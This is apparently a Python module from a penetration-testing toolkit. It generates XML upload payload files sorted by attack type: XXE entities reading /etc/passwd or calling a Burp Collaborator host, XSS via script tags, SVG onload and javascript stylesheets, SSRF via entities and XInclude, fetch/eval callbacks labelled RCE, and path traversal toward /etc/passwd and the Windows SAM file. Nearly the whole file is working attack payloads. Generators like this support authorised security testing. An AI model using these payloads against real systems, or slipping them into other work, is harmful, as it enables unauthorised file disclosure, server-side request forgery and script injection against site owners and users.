from pathlib import Path

try:
    from .ssti_filename_generator import generate_ssti_filename_payloads
    from .xss_filename_generator import generate_xss_filename_payloads
except ImportError:
    try:
        from ssti_filename_generator import generate_ssti_filename_payloads
        from xss_filename_generator import generate_xss_filename_payloads
    except ImportError:
        generate_ssti_filename_payloads = None
        generate_xss_filename_payloads = None

def generate_xml_payloads(output_dir, burp_collab, tech_filter='all', payload_types=None):
    if payload_types is None:
        payload_types = {'all'}
    
    def should_generate_type(payload_type):
        return 'all' in payload_types or payload_type in payload_types
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    if should_generate_type('ssrf'):
        ssrf_dir = output_dir / 'ssrf'
        ssrf_dir.mkdir(exist_ok=True)
    if should_generate_type('xxe'):
        xxe_dir = output_dir / 'xxe'
        xxe_dir.mkdir(exist_ok=True)
    if should_generate_type('rce') or should_generate_type('deserialization'):
        rce_dir = output_dir / 'rce'
        rce_dir.mkdir(exist_ok=True)
    if should_generate_type('xss'):
        xss_dir = output_dir / 'xss'
        xss_dir.mkdir(exist_ok=True)
    if should_generate_type('path_traversal'):
        path_traversal_dir = output_dir / 'path_traversal'
        path_traversal_dir.mkdir(exist_ok=True)
    
    xml_xxe1_entity = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-xml-1">
]>
<root>
<data>&xxe;</data>
</root>'''
    if should_generate_type('xxe'):
        with open(xxe_dir / "xxe1_entity.xml", 'w', encoding='utf-8') as f:
            f.write(xml_xxe1_entity)
    
    xml_xxe2_https = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "https://{burp_collab}/xxe-xml-2">
]>
<root>
<data>&xxe;</data>
</root>'''
    if should_generate_type('xxe'):
        with open(xxe_dir / "xxe2_https.xml", 'w', encoding='utf-8') as f:
            f.write(xml_xxe2_https)
    
    xml_xxe3_file = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
<data>&xxe;</data>
</root>'''
    if should_generate_type('xxe'):
        with open(xxe_dir / "xxe3_file.xml", 'w', encoding='utf-8') as f:
            f.write(xml_xxe3_file)
    
    xml_xxe4_parameter = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "{base_url}/xxe-xml-4">
%xxe;
]>
<root>
<data>test</data>
</root>'''
    if should_generate_type('xxe'):
        with open(xxe_dir / "xxe4_parameter.xml", 'w', encoding='utf-8') as f:
            f.write(xml_xxe4_parameter)
    
    xml_xxe5_doctype = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-xml-5">
]>
<root>
<data>&xxe;</data>
</root>'''
    if should_generate_type('xxe'):
        with open(xxe_dir / "xxe5_doctype.xml", 'w', encoding='utf-8') as f:
            f.write(xml_xxe5_doctype)
    
    xml_xss1_script = f'''<?xml version="1.0" encoding="UTF-8"?>
<root>
<script>alert(1)</script>
</root>'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss1_script.xml", 'w', encoding='utf-8') as f:
            f.write(xml_xss1_script)
    
    xml_xss2_cdata = f'''<?xml version="1.0" encoding="UTF-8"?>
<root>
<data><![CDATA[<script>alert(1)</script>]]></data>
</root>'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss2_cdata.xml", 'w', encoding='utf-8') as f:
            f.write(xml_xss2_cdata)
    
    xml_xss3_svg = f'''<?xml version="1.0" encoding="UTF-8"?>
<root>
<svg onload=alert(1) xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<rect width="100" height="100" fill="red"/>
</svg>
</root>'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss3_svg.xml", 'w', encoding='utf-8') as f:
            f.write(xml_xss3_svg)
    
    xml_xss4_stylesheet = f'''<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet href="javascript:alert(1)"?>
<root>
<data>test</data>
</root>'''
    if should_generate_type('xss'):
        with open(xss_dir / "xss4_stylesheet.xml", 'w', encoding='utf-8') as f:
            f.write(xml_xss4_stylesheet)
    
    if should_generate_type('ssrf'):
        xml_ssrf1_entity = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/ssrf-xml-1">
]>
<root>
<data>&xxe;</data>
</root>'''
        with open(ssrf_dir / "ssrf1_entity.xml", 'w', encoding='utf-8') as f:
            f.write(xml_ssrf1_entity)
        
        xml_ssrf2_https = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "https://{burp_collab}/ssrf-xml-2">
]>
<root>
<data>&xxe;</data>
</root>'''
        with open(ssrf_dir / "ssrf2_https.xml", 'w', encoding='utf-8') as f:
            f.write(xml_ssrf2_https)
        
        xml_ssrf3_parameter = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "{base_url}/ssrf-xml-3">
%xxe;
]>
<root>
<data>test</data>
</root>'''
        with open(ssrf_dir / "ssrf3_parameter.xml", 'w', encoding='utf-8') as f:
            f.write(xml_ssrf3_parameter)
        
        xml_ssrf4_stylesheet = f'''<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet href="{base_url}/ssrf-xml-4"?>
<root>
<data>test</data>
</root>'''
        with open(ssrf_dir / "ssrf4_stylesheet.xml", 'w', encoding='utf-8') as f:
            f.write(xml_ssrf4_stylesheet)
        
        xml_ssrf5_xinclude = f'''<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="{base_url}/ssrf-xml-5" parse="text"/>
</root>'''
        with open(ssrf_dir / "ssrf5_xinclude.xml", 'w', encoding='utf-8') as f:
            f.write(xml_ssrf5_xinclude)
    
    if should_generate_type('rce') or should_generate_type('deserialization'):
        xml_rce1_xslt = f'''<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="{base_url}/rce-xml-xslt1"?>
<root>
<data>test</data>
</root>'''
        with open(rce_dir / "rce1_xslt.xml", 'w', encoding='utf-8') as f:
            f.write(xml_rce1_xslt)
        
        xml_rce2_entity_script = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
<script>&xxe;</script>
</root>'''
        with open(rce_dir / "rce2_entity_script.xml", 'w', encoding='utf-8') as f:
            f.write(xml_rce2_entity_script)
        
        xml_rce3_xinclude_exec = f'''<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="file:///etc/passwd" parse="text"/>
<script>fetch('{base_url}/rce-xml-xinclude1?executed=true')</script>
</root>'''
        with open(rce_dir / "rce3_xinclude_exec.xml", 'w', encoding='utf-8') as f:
            f.write(xml_rce3_xinclude_exec)
        
        xml_rce4_xxe_eval = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/rce-xml-xxe1">
]>
<root>
<script>eval('fetch(\\'{base_url}/rce-xml-eval1\\')')</script>
<data>&xxe;</data>
</root>'''
        with open(rce_dir / "rce4_xxe_eval.xml", 'w', encoding='utf-8') as f:
            f.write(xml_rce4_xxe_eval)
        
        xml_rce5_function = f'''<?xml version="1.0" encoding="UTF-8"?>
<root>
<script>Function('fetch(\\'{base_url}/rce-xml-function1\\')')()</script>
</root>'''
        with open(rce_dir / "rce5_function.xml", 'w', encoding='utf-8') as f:
            f.write(xml_rce5_function)
    
    xml_path1_relative = f'''<?xml version="1.0" encoding="UTF-8"?>
<root>
<file>../../../etc/passwd</file>
</root>'''
    if should_generate_type('path_traversal'):
        with open(path_traversal_dir / "path1_relative.xml", 'w', encoding='utf-8') as f:
            f.write(xml_path1_relative)
    
    xml_path2_windows = f'''<?xml version="1.0" encoding="UTF-8"?>
<root>
<file>..\\..\\..\\windows\\system32\\config\\sam</file>
</root>'''
    if should_generate_type('path_traversal'):
        with open(path_traversal_dir / "path2_windows.xml", 'w', encoding='utf-8') as f:
            f.write(xml_path2_windows)
    
    master_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-xml-master">
]>
<root>
<data>&xxe;</data>
<script>fetch('{base_url}/xss-xml-master')</script>
<file>../../../etc/passwd</file>
</root>'''
    with open(output_dir / "master.xml", 'w', encoding='utf-8') as f:
        f.write(master_xml)
    
    if generate_ssti_filename_payloads and should_generate_type('ssti'):
        generate_ssti_filename_payloads(output_dir, 'xml', burp_collab, tech_filter)
    
    if generate_xss_filename_payloads and should_generate_type('xss'):
        generate_xss_filename_payloads(output_dir, 'xml', burp_collab, tech_filter)
